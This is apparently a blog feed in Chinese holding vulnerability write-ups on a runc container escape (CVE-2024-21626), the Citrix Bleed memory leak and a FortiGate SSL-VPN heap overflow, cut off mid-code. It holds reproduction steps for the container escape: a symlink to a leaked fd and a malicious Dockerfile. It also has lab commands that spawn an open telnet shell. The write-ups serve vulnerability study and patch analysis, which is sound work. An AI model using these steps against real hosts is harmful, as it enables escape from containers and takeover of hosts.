class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line"></span><br><span class="line">_, err = buf.ReadFrom(fd)</span><br><span class="line"><span class="keyword">return</span> buf.String(), err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>另外一处是在这个 <a href="https://github.com/opencontainers/runc/commit/e0c0b0cf321252b8d964fc64d62d21f107615304">commit</a>  中， 但是这个 commit 是 rc92 中 release的， 由于我和 @leoomxj 都暂时没看到这个 commit 打开的 cgroup 是否close 掉了，所以这里也提一句。</del></p><p><del><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-fdcb1245e8a627b547417799eadd58ee-172ae7.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-fdcb1245e8a627b547417799eadd58ee-172ae7.png" alt="image.png"></a></del></p><hr><p>经过仔细阅读公告和通过上面的分析，我们可以了解到问题的根源在于未及时清理打开的 <code>cgroup</code> 文件描述符（fd），导致泄漏。这在 init/exec 过程中表现为在 runc 的 <code>/proc/self/fd/7</code> 中可以找到被打开的 <code>cgroup</code>，但在后续启动的二进制文件中却被关闭了。</p><p>到这，根据公告的利用过程其思路核心为在 <code>runc</code> 创建子进程的时候且 exec(run) 即将执行的二进制文件还没关闭之前， 将 <code>cwd</code>设置为 <code>/proc/self/fd/7</code> , 这个这个时候这个二进制程序进程的 <code>/proc/pid/cwd</code> 就会指向容器外的<code>/sys/fs/cgroup</code> </p><p>接着我们开始做一点简单的漏洞复现</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>公告中提到了如果设置 cwd 为 <code>/proc/self/fd</code> 就会导致逃逸</p><blockquote><p>If the container was configured to have process.cwd set to /proc/self/fd/7/ (the actual fd can change depending on file opening order in runc), the resulting pid1 process will have a working directory in the host mount namespace and thus the spawned process can access the entire host filesystem. </p></blockquote><h3 id="attack-2-runc-exec-过程-docker-exec"><a href="#attack-2-runc-exec-过程-docker-exec" class="headerlink" title="attack 2 runc exec 过程 (docker exec)"></a>attack 2 runc exec 过程 (docker exec)</h3><p>这里先复现比较感兴趣的<code>docker exec</code> 操作导致的容器逃逸， 通过公告的提示，我们做如下操作：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-1ee7b4735f493775570f4ed53cf59e47-74d718.png" title="image-20240201211519027" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-1ee7b4735f493775570f4ed53cf59e47-74d718.png" alt="image-20240201211519027"></a></p><p>这时候发现我们当前的 cwd 目录其实就是在 <code>/sys/fs/cgroup</code>  中，而且是容器外的 <code>cwd</code>， 于是我们使用多个 <code>../</code> 就能读取主机的文件系统文件。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-9848f9fce7b55b711bf45a9a66355abe-617837.png" title="image-20240201211835141" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-9848f9fce7b55b711bf45a9a66355abe-617837.png" alt="image-20240201211835141"></a></p><p>明显能看到 docker exec 的时候  <code>/proc/self/fd/7</code> 确实指向了 <code>cgroup</code> , 于是以此文章提出了一种逃逸场景</p><blockquote><p> The same fd leak and lack of verification of the working directory in attack 1 also apply to <code>runc exec</code>. If a malicious process inside the container knows that some administrative process will call <code>runc exec</code> with the <code>--cwd</code> argument and a given path, in most cases they can replace that path with a symlink to <code>/proc/self/fd/7/</code>. Once the container process has executed the container binary, <code>PR_SET_DUMPABLE</code> protections no longer apply and the attacker can open <code>/proc/$exec_pid/cwd</code> to get access to the host filesystem.</p></blockquote><blockquote><p> <code>runc exec</code> defaults to a cwd of <code>/</code> (which cannot be replaced with a symlink), so this attack depends on the attacker getting a user (or some administrative process) to use <code>--cwd</code> and figuring out what path the target working directory is. Note that if the target working directory is a parent of the program binary being executed, the attacker might be unable to replace the path with a symlink (the <code>execve</code> will fail in most cases, unless the host filesystem layout specifically matches the container layout in specific ways and the attacker knows which binary the <code>runc exec</code> is executing).</p></blockquote><p>具体场景为， 攻击者已经有了容器内shell， 然后需要主机外有 <code>docker exec</code> 命令， 且需要用到 <code>cwd</code>  参数， 然后攻击者得判断或者指定用户即将设置的 <code>cwd</code> 路径和当前这个 runc 是不是也是 fd 为 7 的时候指向 <code>cgroup</code> ， 然后提前设置好符号链接指向 <code>/proc/self/fd/7</code> , 复现流程如下：</p><p>假设我即将设置的 cwd 为 /tmp/hacker, 在容器中执行以下命令</p><ul><li><code>ln -s /proc/self/fd/7 /tmp/hacker</code> </li></ul><p>然后容器外执行一下命令</p><ul><li><code>docker exec -w /tmp/fuck -it cve-2024-21626 /bin/bash</code></li></ul><p>此时就会发现cwd已经是外面的/sys/fs/cgroup 了</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-0aba4477f88cdbe26e5e4b86c4ebc632-d327a5.png" title="image-20240201212846550" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-0aba4477f88cdbe26e5e4b86c4ebc632-d327a5.png" alt="image-20240201212846550"></a></p><h3 id="attack-1-docker-build-gt-恶意镜像"><a href="#attack-1-docker-build-gt-恶意镜像" class="headerlink" title="attack 1 (docker build) -&gt; 恶意镜像"></a>attack 1 (docker build) -&gt; 恶意镜像</h3><p>这里也提一下 docker builid 镜像的攻击手段， 我们从 <a href="https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/">https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/</a> 这个博客可以看到受害者执行一个 run 镜像的操作就被容器逃逸了。</p><p>这里的我的 Dockerfile 内容如下，此时我环境泄漏的 fd 是 8， 这个我是试出来的。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">22.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> ls -al ./</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /proc/self/fd/8</span></span><br></pre></td></tr></table></figure><p>首先 build 我的恶意镜像</p><ul><li><code> docker build -t test .</code></li></ul><p>然后执行恶意镜像</p><ul><li><code> docker run --rm -it test bash</code></li></ul><p>就会发现此时 <code>cwd</code> 就是在 cgroup， 通过 <code>../../</code> 就能穿越到 host 目录中</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-81fb372b81ebd7126f5992037d52b6dd-054740.png" title="image-20240201213539584" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-81fb372b81ebd7126f5992037d52b6dd-054740.png" alt="image-20240201213539584"></a></p><p>在漏洞修复之前，小心恶意镜像投毒哦 ~</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>从这个 <a href="https://github.com/opencontainers/runc/commit/2a4ed3e75b9e80d93d1836a9c4c1ebfa2b78870e">2a4ed3e75b9e80d93d1836a9c4c1ebfa2b78870e</a> commit 中能看到几个比较明显的安全补丁（还有缓解措施）</p><ul><li>使用 <code>O_CLOEXEC</code> flag 来打开文件， 避免子进程继承了父进程的 fd </li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-3d247d8ab3a957ac8360bb6ab274bc26-0d73a8.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-3d247d8ab3a957ac8360bb6ab274bc26-0d73a8.png" alt="image.png"></a></p><p>详情 commit 链接： <a href="https://github.com/opencontainers/runc/commit/89c93ddf289437d5c8558b37047c54af6a0edb48">https://github.com/opencontainers/runc/commit/89c93ddf289437d5c8558b37047c54af6a0edb48</a></p><ul><li>新增了 <code>verifyCwd</code> 函数, 并在<code> finalizeNamespace</code> 中增加调用了 <code>verifyCwd</code> 检查是否cwd在容器namespace外</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-cb49333e16be42b5cb86ebac0feac568-58854c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-cb49333e16be42b5cb86ebac0feac568-58854c.png" alt="image.png"></a></p><ul><li>新增 <code>UnsafeCloseFrom</code> 函数， <code>linuxSetnsInit</code> &amp; <code>linuxStandardInit</code> 中增加了部分该函数的调用，关闭当前进程中大于或等于minFd的所有文件描述符，除了那些对Go运行时关键（例如netpoll管理描述符），</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-e8cef47e36037879dc641a0d85a0db18-3fa173.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-e8cef47e36037879dc641a0d85a0db18-3fa173.png" alt="image.png"></a></p><h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><ol><li>究竟是哪个 commit 是真正引入漏洞的， 有没有同学深入再研究一下。</li><li>为什么提到了 <code>PR_SET_DUMPABLE</code> 这个， 我印象中这个是 core dump 相关的， 在 runc 中这个起了什么作用？</li></ol><h2 id="update-2024-2-2"><a href="#update-2024-2-2" class="headerlink" title="update 2024 / 2/ 2"></a>update 2024 / 2/ 2</h2><p>最近有好多小伙伴发现复现不了该漏洞， 然后 @likesec 同学提到了是 Linux kernel 版本的问题导致复现不了， 因为 5.6 之前的 Linux kernel 是不支持 openat2 这个 <a href="https://man7.org/linux/man-pages/man2/openat2.2.html" title="openat2 syscall ">syscall</a> 的。于是我和@leommxj 一起简单跟了一下代码，然后结果也基本能解决疑问中的第一个问题。</p><p>在<code>libcontainer/cgroups/file.go</code>中的<code>OpenFile-&gt;openFile-&gt;</code>中(注意不是<code>os.OpenFile</code>), 会先使用 <code>prepareOpenat2</code> 尝试用openat2 syscall 打开文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">openFile</span><span class="params">(dir, file <span class="keyword">string</span>, flags <span class="keyword">int</span>)</span> <span class="params">(*os.File, error)</span></span> &#123;</span><br><span class="line">mode := os.FileMode(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> TestMode &amp;&amp; flags&amp;os.O_WRONLY != <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// &quot;emulate&quot; cgroup fs for unit tests</span></span><br><span class="line">flags |= os.O_TRUNC | os.O_CREATE</span><br><span class="line">mode = <span class="number">0</span>o600</span><br><span class="line">&#125;</span><br><span class="line">path := path.Join(dir, utils.CleanPath(file))</span><br><span class="line"><span class="keyword">if</span> prepareOpenat2() != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> openFallback(path, flags, mode)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">fd, err := unix.Openat2(<span class="keyword">int</span>(cgroupRootHandle.Fd()), relPath,</span><br><span class="line">&amp;unix.OpenHow&#123;</span><br><span class="line">...</span><br><span class="line">&#125;)</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时的 Openat2 缺少一个 <code>O_CLOEXEC</code> flag </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-9d92837e64f60509927e8260620ef0dc-0c86a4.png" title="image-20240202182328218" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-9d92837e64f60509927e8260620ef0dc-0c86a4.png" alt="image-20240202182328218"></a></p><p>并且由于是为了测试内核是否支持openat2 syscall， 此fd没有返回，所以后续的defer关闭fd操作也没有对这个fd执行。比如<code>ReadFile</code> 函数的此处<a href="https://github.com/opencontainers/runc/blob/02120488a4c0fc487d1ed2867e901eeed7ce8ecf/libcontainer/cgroups/file.go#L38">代码</a>关闭 fd 。当然也还有其他调用 <code>OpenFIle</code>的方法，也是用类似的方法把 fd 关闭了。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-ae9483121ff1048691b3bdf53943d6a6-e021fd.png" title="image-20240202182051863" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-ae9483121ff1048691b3bdf53943d6a6-e021fd.png" alt="image-20240202182051863"></a></p><p>如果内核不支持，这次调用也就失败了，自然没有成功打开的fd。后续会使用<code>os.OpenFile</code> 打开文件，而go的<code>os.OpenFile</code>在unix平台上会带上<code>syscall.O_CLOEXEC</code> flag，同时正常使用的fd也应该会被后续的代码释放掉。具体可以参考这个<a href="https://github.com/golang/go/blob/master/src/os/file_unix.go#L272">代码</a>：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">openFileNolog</span><span class="params">(name <span class="keyword">string</span>, flag <span class="keyword">int</span>, perm FileMode)</span> <span class="params">(*File, error)</span></span> &#123;</span><br><span class="line">setSticky := <span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> !supportsCreateWithStickyBit &amp;&amp; flag&amp;O_CREATE != <span class="number">0</span> &amp;&amp; perm&amp;ModeSticky != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> _, err := Stat(name); IsNotExist(err) &#123;</span><br><span class="line">setSticky = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> r <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> s poll.SysFile</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">var</span> e error</span><br><span class="line">r, s, e = open(name, flag|syscall.O_CLOEXEC, syscallMode(perm))</span><br><span class="line"><span class="keyword">if</span> e == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此低内核版本的同学会发现复现漏洞失败 ， 因为虽然走到了<code> prepareOpenat2</code> 函数中， 但是并没有成功打开<code>/sys/fs/cgroup/</code>， 因此没有 fd 泄漏的场景</p><p>这里说一句， 也有同学在问如何确定是 fd 的数字， 因为我们现在已经确定了是哪个地方泄漏的 fd ，所以我们其实可以用 strace 来 trace， 例如我要确定 <code>docker run --rm -it test</code> 的时候， 这个时候应该设置多少的 fd， 我们可以对 <code>/usr/bin/containerd</code> 进程进行 strace。</p><p>执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -ff -y -e trace=437 -p $(pidof /usr/bin/containerd)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-0f6475d1e2a3915a62660589961dd305-e66dd0.png" title="image-20240202183039182" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-0f6475d1e2a3915a62660589961dd305-e66dd0.png" alt="image-20240202183039182"></a></p><p>命令中是437是 <code>openat2</code>的syscall 编号，可以看到打开的 fd 是 8 </p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2024-21626" scheme="https://bestwing.me/tags/CVE-2024-21626/"/>
    
    <category term="runc" scheme="https://bestwing.me/tags/runc/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-4966 citrix  内存泄漏</title>
    <link href="https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html"/>
    <id>https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html</id>
    <published>2023-10-24T14:10:14.000Z</published>
    <updated>2023-10-24T15:30:39.623Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>10月18日的时候注意到思杰官网发布了一个安全公告: <a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967">NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966 and CVE-2023-4967</a> 。其中提到一个敏感信息泄露的漏洞。在今天（10月24日），assetnote 发布了一些细节文章，这里简单记录下。</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>这里以 13.0-47 的固件为例子， 从固件拉出 nsppe 这个程序，用 IDA 打开分析。 搜索文章提到的字符串可以看到如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  want_to_write_len = <span class="built_in">snprintf</span>(</span><br><span class="line">                        print_temp_rule,</span><br><span class="line">                        <span class="number">0x10000</span>,</span><br><span class="line">                        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/id&quot;</span></span><br><span class="line">                                      <span class="string">&quot;p/login\&quot;, \&quot;token_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;h&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ttps://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;,&quot;</span></span><br><span class="line">                                      <span class="string">&quot; \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sess&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ion_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported&quot;</span></span><br><span class="line">                                      <span class="string">&quot;\&quot;: true, \&quot;scopes_supported\&quot;: [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [&quot;</span></span><br><span class="line">                                      <span class="string">&quot;\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;, \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;em&quot;</span></span><br><span class="line">                                      <span class="string">&quot;ail\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;ht&quot;</span></span><br><span class="line">                                      <span class="string">&quot;tps://%.*s/oauth/idp/userinfo\&quot;&#125;&quot;</span>,</span><br><span class="line">......</span><br><span class="line">                        hostname);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ns_vpn_send_response(a1, <span class="number">0x100040</span>LL, print_temp_rule, want_to_write_len) )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure><p>这里可以看到，snprintf函数被用于将hostname参数拼接到print_temp_rule变量中，并根据返回的长度，通过ns_vpn_send_response函数返回HTTP请求的结果。这种对snprintf的使用方法是一个常见的错误。这里的hostname参数是由 HTTP 请求中的 Host 头决定的,因此这个参数的长度我们是完全可以控制的。这让我想到一个长亭之前发布的一篇经典文章 <a href="https://zhuanlan.zhihu.com/p/26271959">实战栈溢出：三个漏洞搞定一台路由器</a>。也是使用snprintf 从缓冲区泄漏内存。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-2fe3d848035af324ca8bae785143a63e-8711d2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-2fe3d848035af324ca8bae785143a63e-8711d2.png" alt="image.png"></a></p><p>总结一下就是， snprintf 这个函数应该返回的是 ”想要写入buffer 的字符串长度“ ， 而不是实际写入buffer的字符长长度。可以从一个 DEMO 看出这个效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop cat test.c</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char buf[8];</span><br><span class="line">    memset(buf,0,8);</span><br><span class="line">    int n1 = snprintf(buf, 8, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n1: %d\n&quot;</span>, n1);</span><br><span class="line">    memset(buf,0,8);</span><br><span class="line">    int n2 = snprintf(buf, 8, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;aaaabbbbccccdddd&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n2: %d\n&quot;</span>, n2);</span><br><span class="line">&#125;</span><br><span class="line">➜  Desktop ./a.out</span><br><span class="line">buf: aaa</span><br><span class="line">n1: 3</span><br><span class="line">buf: aaaabbb</span><br><span class="line">n2: 16</span><br></pre></td></tr></table></figure><p>可以看到，当我想写入 16长度的字符串的时候， n2的值为 16， 而不是实际写入的长度。 </p><blockquote><p>The functions snprintf() and vsnprintf() do not write more than size bytes (including the terminating null byte (’\0’))</p></blockquote><p>PoC：</p><p>具体一样长度能不能泄漏出 token ， 看起来和版本还是有关系的，至少我这个版本在 <a href="https://raw.githubusercontent.com/assetnote/exploits/main/citrix/CVE-2023-4966/exploit.py">CVE-2023-4966</a>这个利用中是打不出来的。应该和不同缓冲区的大小不一样?猜测的,具体我就不进一步调试了。</p><p>另外到达这个函数的路由，通过对这个函数 <code>ns_aaa_oauth_send_openid_config</code> 进行交叉引用一下子就看到了：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-eccaaad8f179b9f13f8bf38ecc9698c8-ca5187.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-10-24-eccaaad8f179b9f13f8bf38ecc9698c8-ca5187.png" alt="image.png"></a></p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p><a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</a><br><a href="https://zhuanlan.zhihu.com/p/26271959">实战栈溢出：三个漏洞搞定一台路由器</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2023-4966" scheme="https://bestwing.me/tags/CVE-2023-4966/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</title>
    <link href="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"/>
    <id>https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html</id>
    <published>2023-09-20T16:00:00.000Z</published>
    <updated>2024-04-01T12:44:02.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>由于<code>CVE-2023-27997</code> 漏洞的影响比较大，所以我一直没有公开这篇博客， 但是距离该漏洞公开已经差不多过去了三个月了， 公网的设备应该都修的差不多了吧， 因此这里可以大家分享一下当时我和@leommxj 一起复现该漏洞的笔记。</p><p>更具体的漏洞细节可以参考这篇文章： <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">Pre-authentication Remote Code Execution on Fortigate VPN </a>, 而我这里分析版本依旧是 7.2.2</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>参考可以参考我上一篇文章 《CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow》</p><p>在调试的时候 ， 找 @leommxj 和 @explorer 帮我配置了网络环境， 一开始用的是 gdb + vmware 的调试方法，后面改用 gdbserver + gdb 的方法了， 由于 fortigate 的防火墙原因，我们复用了 22 端口 和23 端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $(pidof sshd) &amp;&amp; .&#x2F;busybox_TELNETD -b 0.0.0.0:22 -l &#x2F;bin&#x2F;sh</span><br><span class="line">kill -9 $(pidof telnetd) &amp;&amp; .&#x2F;gdbserver 0.0.0.0:23 --attach  $(pidof sslvpnd)</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当我们向 fortigate sslvpn 发送一个 <code>enc</code> 的 HTTP 参数的时候, 会进到一个 <code>parse_enc_data</code> 的函数逻辑里. </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" alt="image.png"></a></p><p>另外这个 <code>enc</code> 处理的 URI 有很多可以进来, 包括 <code>/remote/hostcheck_validate</code>  以及 ^[1] 提到的 <code>/remote/logincheck</code> , 具体 URI 的选择,我们后文接着会提到 。这里接着分析  <code>parse_enc_data</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="keyword">const</span> <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v30 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span 